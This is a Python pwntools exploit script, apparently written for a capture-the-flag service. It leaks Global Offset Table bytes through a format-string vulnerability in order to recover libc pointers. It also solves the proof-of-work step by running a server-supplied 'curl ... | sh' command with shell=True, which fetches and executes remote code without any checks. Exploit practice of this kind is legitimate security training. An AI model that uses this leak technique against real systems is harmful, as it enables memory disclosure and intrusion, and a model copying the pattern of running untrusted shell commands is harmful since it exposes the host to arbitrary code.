#!/usr/bin/env python3
from pwn import remote
import struct, sys, time, re, subprocess

HOST="pwn1.cscv.vn"; PORT=6789

def p64(x): return struct.pack("<Q", x)

def run_pow_and_connect():
    r = remote(HOST, PORT, timeout=20)
    r.recvuntil(b'proof of work:')
    pow_line = r.recvline(timeout=10).decode(errors='ignore').strip()
    m = re.search(r'(curl .*?\| *sh .*?$)', pow_line)
    cmd = m.group(1).strip() if m else pow_line
    proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          universal_newlines=True, timeout=40)
    if proc.stdout == "":
        r.close(); raise RuntimeError("POW runner returned no stdout:\n"+proc.stderr)
    sol = proc.stdout.splitlines()[0].strip()
    r.sendline(sol.encode())
    try: r.recvuntil(b"Say something:", timeout=10)
    except: pass
    return r

def leak_byte(k_inbuf, addr):
    r = run_pow_and_connect()
    payload = p64(addr) + b"|" + f"%{k_inbuf}$s".encode() + b"|\n"
    r.send(payload)
    out = b""; start=time.time()
    while True:
        try:
            ch = r.recv(timeout=1)
            if not ch: break
            out += ch
        except Exception:
            if time.time()-start>4: break
    r.close()
    try:
        a = out.index(b"|"); b = out.index(b"|", a+1)
        seg = out[a+1:b]
    except ValueError:
        seg = b""
    return seg[:1], seg  # first byte & full seg for debug

def main():
    if len(sys.argv)<3:
        print("Usage: python3 leak_got_bytes.py <k_inbuf> <got_addr_hex>")
        print("Example: python3 leak_got_bytes.py 12 0x404018")
        return
    k = int(sys.argv[1])
    got = int(sys.argv[2], 16)
    print(f"[*] k_inbuf={k}, GOT={hex(got)}")
    bs=[]
    for i in range(8):
        b, seg = leak_byte(k, got+i)
        v = b[0] if b else 0
        bs.append(v)
        print(f"offset {i}: byte=0x{v:02x} seg={seg[:40]!r}")
    val = 0
    for i, v in enumerate(bs):
        val |= (v & 0xff) << (8*i)
    print("\n[*] GOT content (little-endian 8 bytes) = 0x{:016x}".format(val))
    if hex(val).startswith("0x7f"):
        print("[+] Looks like a libc pointer.")
    elif val==0:
        print("[!] All zeros (maybe first byte is 0x00 and reads stop). Try a different GOT symbol.")
    else:
        print("[*] Not starting with 0x7f but still usable; we only need a valid libc ptr.")
if __name__=="__main__":
    main()
